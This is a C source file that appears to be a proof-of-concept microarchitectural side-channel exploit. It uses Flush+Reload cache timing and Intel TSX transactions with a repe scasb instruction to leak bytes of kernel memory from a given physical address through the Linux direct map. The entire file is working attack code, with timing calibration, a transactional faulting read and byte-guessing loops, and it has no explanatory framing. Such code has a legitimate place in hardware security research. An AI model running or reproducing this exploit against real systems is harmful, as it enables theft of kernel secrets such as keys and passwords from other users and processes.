#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>

#define PAGE_SIZE 4096
#define MEM_SIZE 256
#define TEST_NUM 32

void flush(void *p) { asm volatile("clflush 0(%0)\n" ::"c"(p) : "rax"); }
void maccess(void *p) { asm volatile("movq (%0), %%rax\n" ::"c"(p) : "rax"); }
void mfence() { asm volatile("mfence"); }

static inline uint64_t rdtsc()
{
    register uint64_t a, d;
    asm volatile("mfence");
    asm volatile("rdtsc"
                 : "=a"(a), "=d"(d));
    a = (d << 32) | a;
    asm volatile("mfence");
    return a;
}

int flush_reload_t(void *ptr)
{
    uint64_t start = 0, end = 0;

    start = rdtsc();
    maccess(ptr);
    end = rdtsc();

    mfence();
    flush(ptr);

    return (int)(end - start);
}

int reload_t(void *ptr)
{
    uint64_t start = 0, end = 0;

    start = rdtsc();
    maccess(ptr);
    end = rdtsc();

    mfence();

    return (int)(end - start);
}

size_t detect_flush_reload_threshold()
{
    size_t reload_time = 0, flush_reload_time = 0, i, count = 1000000;
    size_t dummy[16];
    size_t *ptr = dummy + 8;

    maccess(ptr);
    for (i = 0; i < count; i++)
    {
        reload_time += reload_t(ptr);
    }
    for (i = 0; i < count; i++)
    {
        flush_reload_time += flush_reload_t(ptr);
    }
    reload_time /= count;
    flush_reload_time /= count;

    return (flush_reload_time + reload_time * 2) / 3;
}

static inline unsigned int xbegin(void)
{
    int ret = (~0u);
    asm volatile(".byte 0xc7,0xf8 \n\t .long 0"
                 : "+a"(ret)::"memory");
    return ret;
}

int main(int argc, char *argv[])
{
    static int hist[256], count_all[256];
    size_t cache_threshold, secret;

    if (argc >= 2)
        secret = strtoull(argv[1], NULL, 0);
    else
        fscanf(fopen("PHYSICAL_ADDRESS_OF_SECRET", "r"), "%lx", &secret);
    printf("target secret Physical address: \x1b[32;1m0x%zx\x1b[0m\n", secret);
    secret += 0xffff888000000000;

    void *page_pointer_malloc_unaligned, *page_pointer_malloc;
    unsigned char *basic_addr;

    page_pointer_malloc_unaligned = malloc(PAGE_SIZE * 256);
    memset(page_pointer_malloc_unaligned, PAGE_SIZE * 256, 1);
    page_pointer_malloc = (void *)(((uintptr_t)page_pointer_malloc_unaligned + (PAGE_SIZE - 1)) & ~(PAGE_SIZE - 1));
    basic_addr = (unsigned char *)page_pointer_malloc + PAGE_SIZE + PAGE_SIZE * MEM_SIZE / 2;
    printf("%p %p %p\n", page_pointer_malloc_unaligned, page_pointer_malloc, basic_addr);

    cache_threshold = detect_flush_reload_threshold();
    printf("cache_threshold: %ld\n", cache_threshold);

    for (int j = 0; j < 17; j++)
    {
        memset(count_all, 0, sizeof(count_all));
        for (int cmp_str = 0; cmp_str <= 255; cmp_str++)
        {
            for (int k = -(MEM_SIZE / 2); k < MEM_SIZE / 2; k++)
            {
                *(basic_addr + k) = cmp_str;
            }
            for (int i = 0; i < TEST_NUM; i++)
            {
                flush(basic_addr);
                if (xbegin() == (~0u))
                {
                    asm volatile(
                        "mov (%[secret_value]), %%eax \n\t"
                        "repe scasb\n\t" :
                        : [secret_value] "r"(secret + j), [cmp_str] "D"(basic_addr - 1)
                        :);
                }
                if (reload_t(basic_addr) < cache_threshold)
                    count_all[cmp_str]++;
            }
        }

        printf("index: %2d: ", j);
        int max_index = 'A';
        for (int i = 'B'; i < 'z'; i++)
        {
            if (count_all[i] > count_all[max_index])
            {
                max_index = i;
            }
        }
        if (count_all[max_index] > 10)
        {
            printf("%d %c\n", count_all[max_index], max_index);
        }
        else
        {
            printf("\n");
        }
    }
}
